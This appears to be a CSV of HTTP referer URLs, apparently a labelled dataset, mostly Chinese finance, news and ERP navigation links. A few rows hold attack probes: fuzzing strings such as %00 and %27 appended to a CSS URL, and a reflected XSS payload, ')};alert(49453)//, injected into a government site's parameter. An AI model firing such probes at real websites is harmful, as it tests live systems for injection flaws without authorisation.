httpReferer,encoder,mode_is
"http://cxpt.hzwindow.com.cn/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==""",194,0
"http://cxpt.hzwindow.com.cn/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==%00",195,0
"http://cxpt.hzwindow.com.cn/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==%27",196,0
"http://cxpt.hzwindow.com.cn/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg=='""[]()",197,0
"http://cxpt.hzwindow.com.cn/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==-99999999999999999999",198,0
"http://cxpt.hzwindow.com.cn/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==YYYYYYYYYYYYYYYYYYYY",199,0
http://cxpt.hzwindow.com.cn/hdip/static/img/app_qr_pc.0b31bf1.jpg,200,0
http://cxpt.hzwindow.com.cn/hdip/static/js/manifest.3ad1d5771e9b13dbdad2.js,201,0
http://cxpt.hzwindow.com.cn/hdip/user/user_list.action,202,0
http://cxpt.hzwindow.com.cn/static/css/app.4d0d1e76ec2e290e2dc385a77e4e97cb.css,203,0
http://data.eastmoney.com/dzjy/default.html,204,0
http://data.eastmoney.com/dzjy/dzjy_mrmxa.aspx?TimeSpanType=-1&startDate=2020-02-24&endDate=2020-02-24,205,0
http://data.eastmoney.com/gdfx/shareholder/d5c0fe300fe8e13ce74af859ba153333.html,206,0
http://data.eastmoney.com/hsgt/index.html,207,0
http://data.eastmoney.com/zjlx/,208,0
http://dcd-group.cn/%E6%B5%B7%E5%85%89%E5%BC%80%E5%A7%8B%E5%90%AF%E5%8A%A8%E7%94%9F%E4%BA%A7%E5%9F%BA%E4%BA%8Ezen%E6%9E%B6%E6%9E%84%E7%9A%84%E5%A4%84%E7%90%86%E5%99%A8/,209,0
http://demo.zentao.net/tutorial-wizard-story-create-cHJvZHVjdElEPTEmYnJhbmNoPTAmbW9kdWxlSUQ9MA==.html,210,0
http://desk.zol.com.cn/bizhi/8661_106831_2.html,211,0
http://desk.zol.com.cn/bizhi/8661_106832_2.html,212,0
http://desk.zol.com.cn/bizhi/8661_106833_2.html,213,0
http://e.vhall.com/,214,0
http://e.vhall.com/auth/register,215,0
http://edu.avtechcn.com/my/course/421,216,0
http://ent.163.com/,217,0
http://ent.sina.com.cn/m/f/2020-02-24/doc-iimxxstf3858104.shtml,218,0
http://ent.sina.com.cn/v/m/2020-02-11/doc-iimxyqvz1924762.shtml,219,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=CBO.Pub.DepartmentList&sId=3000nid&bId=1001101159162124&ShowType=NavigatePage&ParentForm=beee4a9d-0556-4787-a7f9-38d775f0c4f6&__fsk=__SK55857*__SK55857&__curOId=1001712070000049,220,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=CBO.Pub.DepartmentList&sId=3000nid&bId=1001101159162124&ShowType=NavigatePage&ParentForm=beee4a9d-0556-4787-a7f9-38d775f0c4f6&__fsk=__SK6047*__SK6047&__curOId=1001801170006914,221,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=CBO.Pub.Item.ItemList&sId=3000nid&bId=1001101159162183&ShowType=NavigatePage&ParentForm=053a1be3-2c56-428b-b221-b5291644f2cb&__fsk=__SK13304*__SK13304&__curOId=1001712070000049,222,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=CBO.Pub.Item.ItemList&sId=3000nid&bId=1001101160311154&ShowType=NavigatePage&ParentForm=053a1be3-2c56-428b-b221-b5291644f2cb&__fsk=__SK37905*__SK37905&__curOId=1001712070000049,223,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=CBO.Pub.OperatorList&sId=3000nid&bId=1001101159162125&ShowType=NavigatePage&ParentForm=28c124ba-9e0d-4248-a4c7-58b9e3fe0ea0&__fsk=__SK30713*__SK30713&__curOId=1001801170014659,224,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=CBO.Pub.PredeterminedAccountFactor.PredeterminedAccountFactorList&sId=3000nid&bId=1001101159162216&ShowType=NavigatePage&ParentForm=336259f4-54c3-4743-b66c-d4ec533022f0&__fsk=__SK75091*__SK75091&__curOId=1001712070000049,225,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=EAM.FA.AssetCard.FA_AssetCardBListUIForm&sId=3009nid&bId=1001101160305886&ShowType=NavigatePage&ParentForm=c96f1b8a-a16a-4f73-9e55-0e27909bc823&__fsk=__SK24430*__SK24430&__curOId=1001712070000049&ID=1001812180015837,226,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=EAM.FA.AssetCard.FA_AssetCardBListUIForm&sId=3009nid&bId=1001101160305886&ShowType=NavigatePage&ParentForm=c96f1b8a-a16a-4f73-9e55-0e27909bc823&__fsk=__SK80397*__SK80397&__curOId=1001712070000049,227,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=FI.GL.Account.NaturalAccountListUI&sId=3000nid&mId=1001101159162149&__curOId=1001712070000049,228,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=FI.GL.Account.SOBNaturalAccountListUI&sId=3000nid&bId=1001101159162149&ShowType=NavigatePage&ParentForm=47a75dd9-aaa6-4f39-a17c-b71c1c3559b4&__fsk=__SK20620*__SK20620&__curOId=1001712070000049,229,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=FI.GL.Process.Voucher.VoucherAuditList&VoucherCategory=VoucherApprove&sId=3002nid&mId=1001101160306475&__curOId=1001812050036831,230,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=FI.GL.Process.Voucher.VoucherReverseList&sId=3002nid&bId=1001101160306474&ShowType=NavigatePage&VoucherCategory=VoucherReverse&ParentForm=9407687f-3186-4f56-a7f6-c3af5dd733f7&__fsk=__SK13969*__SK13969&__curOId=1001712070000521,231,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=SCM.INV.INV2020_20&sId=3017nid&bId=1001101160308100&ShowType=NavigatePage&ParentForm=e3df0726-8f25-49f4-a28e-9ce1cba03835&__fsk=__SK19518*__SK19518&__curOId=1001712070000049,232,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=SCM.INV.INV2020_20&sId=3017nid&bId=1001101160308100&ShowType=NavigatePage&ParentForm=e3df0726-8f25-49f4-a28e-9ce1cba03835&__fsk=__SK29186*__SK29186&__curOId=1001712070000049,233,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=SCM.PM.PM3020_20&sId=3016nid&bId=1001101160311113&ShowType=NavigatePage&PR_Type=PM3020&ParentForm=4e0a5ff2-3fcd-4403-8d36-068f37667c4f&__fsk=__SK47288*__SK47288&__curOId=1001712070000049&ID=1001910250008813,234,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=SCM.SD.SDA010_20&sId=3015nid&bId=1001101160311911&ShowType=NavigatePage&ParentForm=7dde4c9d-98a2-4bb1-bc42-bccd74e4e1ac&__fsk=__SK86413*__SK86413&__curOId=1001712070000049,235,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=&chromeType=4&ShowType=ModalRef&SOB=1001712080002065&SOBVersion=-1&IsForReport=1&FilterRefTag=Report&__sk=__SK76075&__curOId=1001712070000049&layerId=170endLayerId,236,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=&chromeType=4&ShowType=ModalRef&SOB=1001712080002065&SOBVersion=-1&IsForReport=1&FilterRefTag=Report&__sk=__SK76075&__curOId=1001712070000049&layerId=180endLayerId,237,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=&chromeType=4&ShowType=ModalRef&SOB=1001712080002065&SOBVersion=-1&IsForReport=1&FilterRefTag=Report&__sk=__SK76075&__curOId=1001712070000049&layerId=252endLayerId,238,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=12endLayerId,239,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=19endLayerId,240,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=22endLayerId,241,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=25endLayerId,242,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=30endLayerId,243,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=3endLayerId,244,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=64endLayerId,245,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=6endLayerId,246,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK6347&__curOId=1001712070000049&layerId=129endLayerId,247,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK6347&__curOId=1001712070000049&layerId=185endLayerId,248,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK6347&__curOId=1001712070000049&layerId=196endLayerId,249,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK6347&__curOId=1001712070000049&layerId=206endLayerId,250,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK6347&__curOId=1001712070000049&layerId=208endLayerId,251,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK6347&__curOId=1001712070000049&layerId=210endLayerId,252,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&QueryNameField=NaturalAccount_Name&QueryField=NaturalAccount_Code&NaturalAccount_Code=660240&ValueByClick=660240&__sk=__SK36221&__curOId=1001801170012724&layerId=39endLayerId,253,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK14794&__curOId=1001801170012724&layerId=85endLayerId,254,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK36221&__curOId=1001801170012724&layerId=43endLayerId,255,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK36221&__curOId=1001801170012724&layerId=94endLayerId,256,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK83948&__curOId=1001801170012724&layerId=24endLayerId,257,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK83948&__curOId=1001801170012724&layerId=30endLayerId,258,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK83948&__curOId=1001801170012724&layerId=35endLayerId,259,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK83948&__curOId=1001801170012724&layerId=37endLayerId,260,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK83948&__curOId=1001801170012724&layerId=45endLayerId,261,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=221101&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&ValueByClick=%E5%B7%A5%E8%B5%84&__sk=__SK36221&__curOId=1001801170012724&layerId=59endLayerId,262,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=22110701&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&ValueByClick=%E5%85%BB%E8%80%81%E4%BF%9D%E9%99%A9&__sk=__SK83948&__curOId=1001801170012724&layerId=47endLayerId,263,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=22110702&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&ValueByClick=%E5%8C%BB%E7%96%97%E4%BF%9D%E9%99%A9&__sk=__SK83948&__curOId=1001801170012724&layerId=49endLayerId,264,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=224104&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&ValueByClick=%E7%A4%BE%E4%BF%9D&__sk=__SK83948&__curOId=1001801170012724&layerId=33endLayerId,265,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=66010106&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&ValueByClick=%E4%BD%8F%E6%88%BF%E5%85%AC%E7%A7%AF%E9%87%91&__sk=__SK83948&__curOId=1001801170012724&layerId=28endLayerId,266,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=66024099&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&QueryNameField=NaturalAccount_Name&QueryField=NaturalAccount_Code&NaturalAccount_Code=6601&ValueByClick=6601&__sk=__SK36221&__curOId=1001801170012724&layerId=48endLayerId,267,0
"http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=d8c3da38-6e99-49fa-8e9f-23dd7a01bc0d&CtrlId=861efa0d-7ad4-4f3f-af82-e2af3fd64767&chromeType=4&ShowType=ModalRef&CurOrgID=1001712070000049&CurDate=2020-02-24%2018%3A45%3A28&UBF_CustomFilter=Org%20=%201001712070000049%20and%20BusinessType%20in%20(316,317,318,319,321,327,328,%20320)%20and%20IsFillin%20=%20%27false%27%20and%20%20IsInitPO%20=%20%27false%27&ValueByClick=%E7%94%9F%E4%BA%A7%E7%89%A9%E6%96%99%E9%87%87%E8%B4%AD&MultiOrgID=&EntityFullName=UFIDA.U9.PM.Pub.PODocType&__sk=__SK80131&__curOId=1001712070000049&layerId=14endLayerId",268,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=f4e7e41f-f46b-4c5b-b7a2-5be7ecea9d76&CtrlId=d06691f7-b9fc-4825-90c1-42b542942753&chromeType=4&ShowType=ModalRef&DPBook=1001712200000841&MultiOrgID=1001712070000049&EntityFullName=UFIDA.U9.Base.SOB.SOBAccountingPeriod&__sk=__SK91823&__curOId=1001712070000049&layerId=19endLayerId,269,0
http://fanyi.youdao.com/,270,0
http://finance.sina.com.cn/realstock/company/sh000001/nc.shtml,271,0
http://finance.sina.com.cn/realstock/company/sh600200/nc.shtml?from=BaiduAladin,272,0
http://finance.sina.com.cn/realstock/company/sh600312/nc.shtml,273,0
http://finance.sina.com.cn/realstock/company/sh600312/nc.shtml?from=BaiduAladin,274,0
http://finance.sina.com.cn/realstock/company/sh601099/nc.shtml,275,0
http://finance.sina.com.cn/realstock/company/sh601111/nc.shtml,276,0
http://finance.sina.com.cn/realstock/company/sh601162/nc.shtml,277,0
http://finance.sina.com.cn/realstock/company/sh601988/nc.shtml,278,0
http://finance.sina.com.cn/realstock/company/sh603416/nc.shtml,279,0
http://finance.sina.com.cn/realstock/company/sh688023/nc.shtml,280,0
http://finance.sina.com.cn/realstock/company/sz000988/nc.shtml,281,0
http://finance.sina.com.cn/realstock/company/sz002185/nc.shtml,282,0
http://finance.sina.com.cn/realstock/company/sz002460/nc.shtml,283,0
http://finance.sina.com.cn/realstock/company/sz300456/nc.shtml,284,0
http://finance.sina.com.cn/realstock/company/sz300803/nc.shtml,285,0
http://finance.sina.com.cn/roll/2020-02-26/doc-iimxxstf4381844.shtml,286,0
http://ftp-new-pc.pconline.com.cn/1406a788573ce787ad5351940dcf7e4e/pub/download/201902/pconline1550817108484.exe,287,0
http://ftrans.cn/solutions/large-file-transfer/?utm_source=baidu_sem&utm_campaign=V5.52.02.%E5%A4%A7%E6%96%87%E4%BB%B6-%E5%8A%9F%E8%83%BD&utm_term=%E5%A4%A7%E6%96%87%E4%BB%B6%20%E4%BC%A0%E8%BE%93&e_creative=21622197755&e_adposition=cl1&e_pagenum=1&e_keywordid=68900829524&e_keywordid2=68900829524,288,0
http://gaj.guilin.gov.cn/site/public/TechListSearchgzdt.aspx,289,0
http://gaj.guilin.gov.cn/site/public/TechListSearchgzdt.aspx?__EVENTVALIDATION=%27)};alert(49453)//,290,0
